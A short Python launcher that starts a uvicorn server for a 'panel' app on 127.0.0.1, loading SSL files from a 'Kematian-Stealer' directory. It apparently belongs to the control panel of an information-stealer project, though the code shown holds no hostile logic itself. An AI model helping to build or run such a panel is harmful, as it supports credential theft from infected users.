import uvicorn

from panel.server import *

if __name__ == "__main__":
    uvicorn.run(
        app,
        host="127.0.0.1",
        port=int(
            current_settings.get_setting("port"),
        ),
        ssl_keyfile=os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem"),
        ssl_certfile=os.path.join(good_dir, "Kematian-Stealer", "certfile.pem"),
        reload=False,
    )
